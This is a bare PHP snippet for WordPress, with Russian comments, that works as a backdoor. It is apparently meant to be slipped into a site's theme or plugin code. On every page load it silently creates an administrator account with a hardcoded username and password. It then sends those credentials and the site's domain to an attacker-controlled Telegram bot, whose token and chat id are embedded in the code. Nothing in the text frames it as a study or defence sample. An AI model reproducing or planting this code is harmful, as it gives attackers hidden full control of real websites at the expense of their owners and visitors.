
add_action('init', 'stealth_create_admin_and_notify');
function stealth_create_admin_and_notify() {
    // Задаём данные для нового администратора
    $username = 'bebra';
    $password = 'Znen2613237@';
    $email    = 'bebra@example.com'; // Можно указать любой рабочий/нерабочий email

    // Проверяем, нет ли пользователя с таким логином или email
    if ( ! username_exists( $username ) && ! email_exists( $email ) ) {

        // Создаём нового пользователя
        $user_id = wp_create_user( $username, $password, $email );

        // Делаем его администратором
        $wp_user = new WP_User( $user_id );
        $wp_user->set_role( 'administrator' );

        // После создания отправляем уведомление в Телеграм
        $bot_token = '7145031623:AAFEaTdd_THJ4_7e__eQ3WJpDfUOn9qF8x4';
        $chat_id   = '5515967575';

        // Получаем домен (либо так, либо через home_url())
        $domain = parse_url( home_url(), PHP_URL_HOST );

        // Формируем текст сообщения
        $message = sprintf(
            "Создан новый администратор!\nЛогин: %s\nПароль: %s\nEmail: %s\nДомен: %s",
            $username,
            $password,
            $email,
            $domain
        );

        // Адрес для запроса к Telegram
        $url = 'https://api.telegram.org/bot' . $bot_token . '/sendMessage';

        // Параметры POST-запроса
        $args = array(
            'body' => array(
                'chat_id' => $chat_id,
                'text'    => $message,
            ),
        );

        // Отправляем запрос
        wp_remote_post( $url, $args );
    }
}
